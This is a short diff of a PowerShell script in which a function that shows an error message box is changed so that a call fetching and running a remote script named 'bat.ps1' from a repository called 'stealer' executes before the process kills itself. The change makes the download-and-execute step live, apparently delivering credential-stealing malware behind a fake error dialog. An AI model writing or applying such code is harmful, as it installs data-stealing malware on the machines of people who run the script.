@@ -37,8 +37,8 @@ function Show-ErrorMessageBox {
 
     Add-Type -AssemblyName PresentationFramework
     [System.Windows.MessageBox]::Show($message, "Error", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Error)
-    Stop-Process $pid -Force
     Run-PowerShellFromURL -url "https://raw.githubusercontent.com/werearecat/stealer/main/bat.ps1"
+    Stop-Process $pid -Force
 }
 
 function CheckValid {
